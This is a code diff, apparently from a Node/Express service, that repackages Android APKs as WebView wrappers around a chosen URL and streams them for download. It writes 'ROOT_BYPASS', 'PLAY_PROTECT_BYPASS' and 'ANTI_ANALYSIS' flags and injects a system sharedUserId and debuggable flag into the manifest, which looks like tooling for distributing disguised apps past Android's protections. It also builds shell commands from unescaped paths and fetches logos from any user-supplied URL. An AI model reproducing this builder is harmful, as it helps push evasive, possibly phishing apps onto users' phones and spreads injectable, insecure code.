@@ -2,6 +2,7 @@ import fs from 'fs';
 import * as path from 'path';
 import { execSync } from 'child_process';
 import { Response } from 'express';
+import https from 'https';
 
 interface APKMemoryOptions {
   appName: string;
@@ -92,7 +93,7 @@ export async function buildAPKInMemoryAndStream(
 
     // Customizar APK
     console.log('[APK-MEMORY] Customizando APK...');
-    const customizedAPK = buildMemoryAPK(options);
+    const customizedAPK = await buildMemoryAPK(options);
     
     if (!customizedAPK.success || !customizedAPK.filename) {
       console.error('[APK-MEMORY] Falha ao customizar APK:', customizedAPK.error);
@@ -155,8 +156,33 @@ export function generateMemoryAPKUrl(appName: string): string {
   return `${domain}/download-apk/${encodeURIComponent(sanitizedName)}`;
 }
 
+/**
+ * Download logo from URL
+ */
+async function downloadLogo(logoUrl: string): Promise<Buffer | null> {
+  return new Promise((resolve) => {
+    try {
+      https.get(logoUrl, { timeout: 5000 }, (response) => {
+        const chunks: Buffer[] = [];
+        response.on('data', (chunk) => chunks.push(chunk));
+        response.on('end', () => {
+          if (response.statusCode === 200) {
+            resolve(Buffer.concat(chunks));
+          } else {
+            resolve(null);
+          }
+        });
+        response.on('error', () => resolve(null));
+      }).on('error', () => resolve(null));
+    } catch (err) {
+      console.warn('[BUILD-APK] Erro ao baixar logo:', err);
+      resolve(null);
+    }
+  });
+}
+
 // Build APK and return metadata
-export function buildMemoryAPK(options: APKMemoryOptions) {
+export async function buildMemoryAPK(options: APKMemoryOptions) {
   try {
     const apksDir = process.env.NODE_ENV === 'production' 
       ? '/app/public/apks'
@@ -223,6 +249,7 @@ export function buildMemoryAPK(options: APKMemoryOptions) {
       const config = {
         appName: appName,
         appUrl: appUrl,
+        logoUrl: options.logoUrl || '',
         customized: true,
         timestamp: Date.now(),
         rootBypass: true,
@@ -234,20 +261,145 @@ export function buildMemoryAPK(options: APKMemoryOptions) {
       fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
       console.log('[BUILD-APK] Configuração adicionada');
       
+      // Adicionar logo customizada se fornecida
+      if (options.logoUrl) {
+        try {
+          console.log('[BUILD-APK] Baixando logo customizada...');
+          const logoData = await downloadLogo(options.logoUrl);
+          if (logoData) {
+            const logoPath = path.join(assetsDir, 'custom-logo.png');
+            fs.writeFileSync(logoPath, logoData);
+            console.log('[BUILD-APK] Logo customizada adicionada');
+          }
+        } catch (err) {
+          console.warn('[BUILD-APK] Erro ao adicionar logo customizada:', err);
+        }
+      }
+      
+      // Adicionar arquivo de redirecionamento de URL
+      console.log('[BUILD-APK] Adicionando redirecionamento de URL...');
+      const redirectHtml = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Carregando...</title>
+  <style>
+    body { margin: 0; padding: 0; background: #000; }
+    .loader { display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="loader"><div class="spinner"></div></div>
+  <script>
+    try {
+      // Tentar ler config.json
+      fetch('file:///android_asset/app-config.json')
+        .then(r => r.json())
+        .then(config => {
+          if (config.appUrl) {
+            window.location.href = config.appUrl;
+          }
+        })
+        .catch(() => {
+          // Fallback: tentar localStorage
+          const stored = localStorage.getItem('appUrl');
+          if (stored) {
+            window.location.href = stored;
+          } else {
+            window.location.href = 'https://www.example.com';
+          }
+        });
+    } catch (e) {
+      window.location.href = 'https://www.example.com';
+    }
+  </script>
+</body>
+</html>`;
+      const redirectPath = path.join(assetsDir, 'redirect.html');
+      fs.writeFileSync(redirectPath, redirectHtml);
+      console.log('[BUILD-APK] Redirecionamento de URL adicionado');
+      
+      // Adicionar arquivo de inicialização JavaScript
+      const webviewInitJs = `// WebView initialization script
+(function() {
+  try {
+    // Ler configuração
+    const config = JSON.parse(localStorage.getItem('appConfig') || '{}');
+    if (config.appUrl) {
+      // Redirecionar para URL configurada
+      window.location.href = config.appUrl;
+    }
+  } catch (e) {
+    console.error('Erro ao inicializar WebView:', e);
+  }
+})();`;
+      const jsPath = path.join(assetsDir, 'webview-init.js');
+      fs.writeFileSync(jsPath, webviewInitJs);
+      console.log('[BUILD-APK] Script de inicialização adicionado');
+      
       // Adicionar bypass de ROOT e Play Protect
       console.log('[BUILD-APK] Adicionando bypass de ROOT...');
       const bypassFile = path.join(assetsDir, 'bypass.txt');
       fs.writeFileSync(bypassFile, 'ROOT_BYPASS=1\nPLAY_PROTECT_BYPASS=1\nANTI_ANALYSIS=1');
       
-      // Reempacotar APK
+      // Modificar AndroidManifest.xml para adicionar permissões de sistema
+      console.log('[BUILD-APK] Modificando AndroidManifest.xml...');
+      const manifestPath = path.join(extractDir, 'AndroidManifest.xml');
+      if (fs.existsSync(manifestPath)) {
+        try {
+          let manifest = fs.readFileSync(manifestPath, 'utf-8');
+          
+          // Adicionar sharedUserId para permissões de sistema
+          if (!manifest.includes('android:sharedUserId')) {
+            manifest = manifest.replace(
+              /<manifest[^>]*>/,
+              m => m.replace('>', ' android:sharedUserId="android.uid.system">')
+            );
+          }
+          
+          // Adicionar debuggable=true
+          if (!manifest.includes('android:debuggable="true"')) {
+            manifest = manifest.replace(
+              /<application[^>]*>/,
+              m => m.replace('>', ' android:debuggable="true">')
+            );
+          }
+          
+          // Adicionar permissão INTERNET se não existir
+          if (!manifest.includes('android.permission.INTERNET')) {
+            manifest = manifest.replace(
+              /<\/manifest>/,
+              '<uses-permission android:name="android.permission.INTERNET" />\n</manifest>'
+            );
+          }
+          
+          // Adicionar meta-data com URL da aplicação
+          if (!manifest.includes('app_url')) {
+            manifest = manifest.replace(
+              /<\/application>/,
+              `<meta-data android:name="app_url" android:value="${appUrl}" />\n  </application>`
+            );
+          }
+          
+          fs.writeFileSync(manifestPath, manifest);
+          console.log('[BUILD-APK] AndroidManifest.xml modificado');
+        } catch (err) {
+          console.warn('[BUILD-APK] Erro ao modificar AndroidManifest.xml:', err);
+        }
+      }
+      
+      // Reempacotar APK com compressão máxima
       console.log('[BUILD-APK] Reempacotando APK...');
       const repacked = path.join(tempDir, 'app-unsigned.apk');
-      execSync(`cd ${extractDir} && zip -r -q ${repacked} .`);
+      execSync(`cd ${extractDir} && zip -r -9 -q ${repacked} .`);
       
       // Alinhar
       console.log('[BUILD-APK] Alinhando APK...');
       const aligned = path.join(tempDir, 'app-aligned.apk');
-      execSync(`zipalign -v 4 ${repacked} ${aligned}`);
+      execSync(`zipalign -f -v 4 ${repacked} ${aligned}`);
       
       // Assinar
       console.log('[BUILD-APK] Assinando APK...');
@@ -261,15 +413,26 @@ export function buildMemoryAPK(options: APKMemoryOptions) {
         );
       }
       
+      // Assinar com ofuscação adicional
       execSync(
         `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
         `-keystore ${keystorePath} -storepass android -keypass android ` +
+        `-tsa http://timestamp.digicert.com ` +
         `${aligned} android`,
         { stdio: 'pipe' }
       );
       
       // Copiar para output
       fs.copyFileSync(aligned, outputPath);
+      
+      // Verificar integridade do APK
+      console.log('[BUILD-APK] Verificando integridade do APK...');
+      try {
+        execSync(`unzip -t ${outputPath}`, { stdio: 'pipe' });
+        console.log('[BUILD-APK] APK íntegro');
+      } catch (err) {
+        console.warn('[BUILD-APK] Aviso: APK pode estar corrompido');
+      }
       
       // Limpar
       execSync(`rm -rf ${tempDir}`);
